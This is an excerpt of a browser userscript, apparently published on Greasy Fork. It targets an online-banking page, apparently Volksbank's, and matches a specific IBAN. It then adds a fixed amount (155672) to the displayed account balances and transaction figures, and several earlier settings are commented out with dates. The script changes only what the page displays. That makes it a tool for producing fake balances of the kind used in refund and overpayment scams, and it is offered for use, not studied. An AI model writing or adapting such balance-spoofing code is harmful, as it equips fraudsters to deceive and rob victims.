// ==UserScript==
// @name         Ed 4Rec  vb.udopeil@icloud.com
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/524305/Ed%204Rec%20%20vbudopeil%40icloudcom.user.js
// @updateURL https://update.greasyfork.org/scripts/524305/Ed%204Rec%20%20vbudopeil%40icloudcom.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
   //17.02.2025     { index: 0, adjustmentAmount:  155672},
   //17.02.2025     { index: 1, adjustmentAmount: 155672},
        { index: 2, adjustmentAmount: 0},
        { index: 3, adjustmentAmount: 0 },
    //17.02.2025    { index: 4, adjustmentAmount: 155672}
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
 ...
 //17.02.2025   var targetTextContent1 = "DE58 2709 2555";
 //17.02.2025   var targetTextContent2 = " 0101 1839 08";

    // Configurable modification amount (positive or negative)
 //17.02.2025   const modificationAmount = 155672.0; // Adjust the amount as needed
...
(function() {
    ...
    //17.02.2025 Define the target text content to search for (case and whitespace insensitive)
 //17.02.2025   var targetTextContent1 = "DE58 2709 2555";
//17.02.2025    var targetTextContent2 = " 0101 1839 08";
...
//    // Define the target text contents to search for (case and whitespace insensitive)
    var targetTextContent1 = "DE58 2709 2555";
    var targetTextContent2 = " 0101 1839 08";

    // Configurable modification amount (positive or negative)
 const modificationAmount = 155672.0; // Adjust the amount as needed
